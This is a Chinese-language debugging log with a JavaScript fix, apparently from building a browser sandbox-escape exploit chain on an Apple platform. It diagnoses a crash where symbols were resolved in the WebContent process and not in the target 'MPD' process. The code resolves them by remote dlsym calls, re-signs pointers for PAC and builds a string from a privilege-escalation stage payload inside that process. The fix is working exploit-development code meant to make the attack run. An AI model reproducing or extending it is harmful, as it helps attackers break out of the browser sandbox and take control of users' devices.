# 调试日志：pe_stage_1_cfstring 崩溃问题

## 问题描述

崩溃在 "Creating pe_stage_1_cfstring..." 之后。

## 问题分析

### 根本原因

`CFSTRINGCREATEWITHCSTRING` 是在 WebContent 进程中解析的（使用 `func_resolve`），但 `mpd_fcall` 在 MPD 进程中执行。

这意味着：
- `CFStringCreateWithCString` 的地址是 WebContent 进程的地址
- `kCFAllocatorDefault` 也是 WebContent 进程的地址
- 但 `mpd_fcall` 需要 MPD 进程的函数地址

### 修复方案

在 `spawn_pe` 中使用 MPD 进程的 DLSYM 解析这些符号，而不是使用 WebContent 进程的地址。

## 修复代码

```javascript
// Resolve CFStringCreateWithCString in MPD context
let MPD_CFStringCreateWithCString = mpd_fcall(globalDLSYM, 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("CFStringCreateWithCString"));
MPD_CFStringCreateWithCString = mpd_pacia(MPD_CFStringCreateWithCString.noPAC(), 0xc2d0n);

// kCFAllocatorDefault is a pointer stored at __kCFAllocatorDefault
let MPD_kCFAllocatorDefault = mpd_fcall(globalDLSYM, 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("kCFAllocatorDefault"));
MPD_kCFAllocatorDefault = mpd_read64(MPD_kCFAllocatorDefault.noPAC());

let MPD_kCFStringEncodingUTF8 = 0x08000100n;

let pe_stage_1_cfstring = mpd_fcall(MPD_CFStringCreateWithCString, MPD_kCFAllocatorDefault, mpd_get_cstring(pe_stage1_js_data), MPD_kCFStringEncodingUTF8);
```

## 待确认

`pe_stage1_js_data` 和 `pe_main_js_data` 不是字符串，而是 JS 代码数据。需要确认：
- 这两个变量的实际类型是什么？
- `mpd_get_cstring(...)` 是否只接受 JS 字符串？
- 是否需要其他方式处理非字符串数据？

## 修改位置

文件：`sbx1_main.js`，大约在 6803-6814 行附近。